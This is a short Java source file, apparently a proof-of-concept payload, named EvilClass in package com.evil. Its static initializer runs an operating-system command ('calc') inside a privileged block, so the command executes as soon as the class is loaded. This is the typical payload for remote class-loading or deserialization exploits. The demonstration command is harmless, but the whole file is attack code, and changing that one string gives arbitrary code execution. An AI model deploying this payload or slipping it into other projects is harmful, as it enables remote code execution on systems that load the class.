package com.evil;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.security.AccessController;
import java.security.PrivilegedAction;

public class EvilClass {
    static {
        AccessController.doPrivileged(new PrivilegedAction() {
            @Override
            public Object run() {
                try {
                    Process process = Runtime.getRuntime().exec("calc");
                    return null;
                } catch (Exception e) {
                    e.printStackTrace();
                    return null;
                }
            }
        });
    }
}
